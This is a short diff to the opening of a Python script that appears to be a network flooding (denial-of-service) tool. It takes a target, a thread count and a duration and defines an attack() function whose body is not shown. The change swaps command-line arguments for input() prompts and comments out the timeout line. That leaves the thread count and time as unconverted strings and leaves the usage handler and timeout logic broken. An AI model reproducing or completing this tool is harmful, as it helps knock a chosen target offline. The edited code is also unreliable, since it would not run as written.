@@ -1,14 +1,14 @@
 import socket, random, threading, sys, time
 
 try: 
-    target = str(sys.argv[1])
-    threads = int(sys.argv[2])
-    timer = float(sys.argv[3])
+    target = input('target: ')
+    threads = input('threads: ')
+    timer = input('time: ')
 except IndexError:
     print('\n[+] Command usage: Python' + sys.argv[0] + ' <target> <thread> <time> !')
     sys.exit()
 
-timeout = time.time() + 1 * timer 
+#timeout = time.time() + 1 * timer 
 
 def attack():
     try:
